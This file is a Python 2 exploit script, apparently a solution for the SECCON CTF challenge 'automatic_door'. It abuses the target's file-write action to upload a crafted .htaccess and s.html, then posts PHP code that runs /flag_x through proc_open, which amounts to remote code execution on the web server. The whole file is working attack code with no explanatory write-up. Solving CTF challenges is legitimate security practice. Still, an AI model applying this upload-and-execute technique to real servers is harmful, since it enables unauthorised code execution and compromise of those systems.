#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests


url = "http://automatic_door.pwn.seccon.jp/0b503d0caf712352fc200bc5332c4f95/"


def write(filename, dstfile):
    params = {
        "action": "write",
        "filename": filename
    }
    r = requests.post(
        url, params=params,
        files={
            "file": open(dstfile, 'rb')
        }
    )
    print r.content


def read(filename):
    params = {
        "action": "read",
        "filename": filename
    }
    r = requests.get(url, params=params)
    return r


def pwd():
    params = {
        "action": "pwd",
    }
    r = requests.get(url, params=params)
    return r.content


def execCmd(cmd):
    mdir = pwd()
    data = {
        "e": cmd
    }
    r = requests.post(url + mdir + "s.html", data)
    print r.content

if __name__ == '__main__':
    write(".htaccess", ".htaccess")
    write("s.html", "s.html")
    cmd = '''
$descriptorspec = array(
    0 => array("pipe", "r"),
    1 => array("pipe", "w"),
    2 => array("file", "/tmp/error-output.txt", "a") );
$process = proc_open("/flag_x", $descriptorspec, $pipes, '');
echo stream_get_contents($pipes[1]);
fclose($pipes[1]);
    '''
    execCmd(cmd)
